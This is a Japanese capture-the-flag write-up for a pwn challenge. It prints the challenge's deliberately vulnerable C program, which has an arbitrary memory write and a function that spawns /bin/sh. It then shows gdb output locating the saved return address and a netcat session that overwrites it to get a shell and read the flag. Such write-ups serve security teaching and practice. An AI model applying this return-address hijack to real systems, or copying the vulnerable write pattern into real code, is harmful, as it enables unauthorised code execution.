# write_where_what:Pwn:104pts
メモリなんて書き換えちゃえっ！！  
```
nc 27.133.155.191 30003
```
[main.c](main.c)　　　　[write_where_what](write_where_what)  

# Solution
ソースとバイナリが配布されている。  
メモリの任意の個所を書き換えるプログラムのようだ。  
```c:main.c
#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>

void call_me_to_win() {
	system("/bin/sh");
}

int main() {
	// set up for CTF
  setvbuf(stdin, NULL, _IONBF, 0); 
  setvbuf(stdout, NULL, _IONBF, 0);
	alarm(60);

	
	printf("call_me_to_win at %p\n", call_me_to_win);

	unsigned long value = 1; // I like unsigned long value!
	printf("%lx\n", &value);

	size_t where, what;

	printf("where:");
	scanf("%lx", &where);
	printf("what:");
	scanf("%lx", &what);

	*(size_t*)where = what; // where に what を書き込む
}
```
```bash
$ nc 27.133.155.191 30003
call_me_to_win at 0x401e15
7fffbc2ae610
where:7fffbc2ae610
what:2
```
`value`からリターンアドレス格納箇所を計算し、`call_me_to_win()`のアドレスに書き換えればよい。  
以下のようにリターンアドレス格納箇所の特定を行う(一部の出力を省略している)。  
```bash
$ gdb ./write_where_what
gdb-peda$ disass main
Dump of assembler code for function main:
   0x0000000000401e28 <+0>:     push   rbp
   0x0000000000401e29 <+1>:     mov    rbp,rsp
   0x0000000000401e2c <+4>:     sub    rsp,0x20
   0x0000000000401e30 <+8>:     mov    rax,QWORD PTR fs:0x28
   0x0000000000401e39 <+17>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401e3d <+21>:    xor    eax,eax
   0x0000000000401e3f <+23>:    mov    rax,QWORD PTR [rip+0xcc892]        # 0x4ce6d8 <stdin>
   0x0000000000401e46 <+30>:    mov    ecx,0x0
   0x0000000000401e4b <+35>:    mov    edx,0x2
   0x0000000000401e50 <+40>:    mov    esi,0x0
   0x0000000000401e55 <+45>:    mov    rdi,rax
   0x0000000000401e58 <+48>:    call   0x417c90 <setvbuf>
   0x0000000000401e5d <+53>:    mov    rax,QWORD PTR [rip+0xcc86c]        # 0x4ce6d0 <stdout>
   0x0000000000401e64 <+60>:    mov    ecx,0x0
   0x0000000000401e69 <+65>:    mov    edx,0x2
   0x0000000000401e6e <+70>:    mov    esi,0x0
   0x0000000000401e73 <+75>:    mov    rdi,rax
   0x0000000000401e76 <+78>:    call   0x417c90 <setvbuf>
   0x0000000000401e7b <+83>:    mov    edi,0x3c
   0x0000000000401e80 <+88>:    call   0x44d8d0 <alarm>
   0x0000000000401e85 <+93>:    lea    rsi,[rip+0xffffffffffffff89]        # 0x401e15 <call_me_to_win>
   0x0000000000401e8c <+100>:   lea    rdi,[rip+0x9e179]        # 0x4a000c
   0x0000000000401e93 <+107>:   mov    eax,0x0
   0x0000000000401e98 <+112>:   call   0x409a80 <printf>
   0x0000000000401e9d <+117>:   mov    QWORD PTR [rbp-0x20],0x1
   0x0000000000401ea5 <+125>:   lea    rax,[rbp-0x20]
   0x0000000000401ea9 <+129>:   mov    rsi,rax
   0x0000000000401eac <+132>:   lea    rdi,[rip+0x9e16f]        # 0x4a0022
   0x0000000000401eb3 <+139>:   mov    eax,0x0
   0x0000000000401eb8 <+144>:   call   0x409a80 <printf>
   0x0000000000401ebd <+149>:   lea    rdi,[rip+0x9e163]        # 0x4a0027
   0x0000000000401ec4 <+156>:   mov    eax,0x0
   0x0000000000401ec9 <+161>:   call   0x409a80 <printf>
   0x0000000000401ece <+166>:   lea    rax,[rbp-0x18]
   0x0000000000401ed2 <+170>:   mov    rsi,rax
   0x0000000000401ed5 <+173>:   lea    rdi,[rip+0x9e152]        # 0x4a002e
   0x0000000000401edc <+180>:   mov    eax,0x0
   0x0000000000401ee1 <+185>:   call   0x409c10 <__isoc99_scanf>
   0x0000000000401ee6 <+190>:   lea    rdi,[rip+0x9e145]        # 0x4a0032
   0x0000000000401eed <+197>:   mov    eax,0x0
   0x0000000000401ef2 <+202>:   call   0x409a80 <printf>
   0x0000000000401ef7 <+207>:   lea    rax,[rbp-0x10]
   0x0000000000401efb <+211>:   mov    rsi,rax
   0x0000000000401efe <+214>:   lea    rdi,[rip+0x9e129]        # 0x4a002e
   0x0000000000401f05 <+221>:   mov    eax,0x0
   0x0000000000401f0a <+226>:   call   0x409c10 <__isoc99_scanf>
   0x0000000000401f0f <+231>:   mov    rax,QWORD PTR [rbp-0x18]
   0x0000000000401f13 <+235>:   mov    rdx,rax
   0x0000000000401f16 <+238>:   mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000401f1a <+242>:   mov    QWORD PTR [rdx],rax
   0x0000000000401f1d <+245>:   mov    eax,0x0
   0x0000000000401f22 <+250>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x0000000000401f26 <+254>:   sub    rcx,QWORD PTR fs:0x28
   0x0000000000401f2f <+263>:   je     0x401f36 <main+270>
   0x0000000000401f31 <+265>:   call   0x450f10 <__stack_chk_fail_local>
   0x0000000000401f36 <+270>:   leave
   0x0000000000401f37 <+271>:   ret
End of assembler dump.
gdb-peda$ b *0x0000000000401f37
Breakpoint 1 at 0x401f37
gdb-peda$ r
Starting program: /write_where_what
call_me_to_win at 0x401e15
7ffffffed550
where:7ffffffed550
what:2
gdb-peda$ stack
0000| 0x7ffffffed578 --> 0x4029fa (<__libc_start_main+1434>:    mov    edi,eax)
0008| 0x7ffffffed580 --> 0x0
0016| 0x7ffffffed588 --> 0x100000000
0024| 0x7ffffffed590 --> 0x7ffffffed6c8 --> 0x7ffffffed907 ("/write_where_what")
0032| 0x7ffffffed598 --> 0x401e28 --> 0x20ec8348e5894855
0040| 0x7ffffffed5a0 --> 0x600000000
0048| 0x7ffffffed5a8 --> 0x30000005e
0056| 0x7ffffffed5b0 --> 0x50 ('P')
```
`value`が0x7ffffffed550であり、リターンアドレス格納箇所が0x7ffffffed578である。  
これによって0x28後の部分を書き換えればよいことがわかる。  
以下のように書き換えを行う。  
```bash
$ nc 27.133.155.191 30003
call_me_to_win at 0x401e15
7fff4389c080
where:7fff4389c0a8
what:401e15
ls
entry.sh
flag.txt
write_where_what
cat flag.txt
xm4s{i_can_rewrite_memory...}
```
シェルが得られ、flagが読み取れた。  

## xm4s{i_can_rewrite_memory...}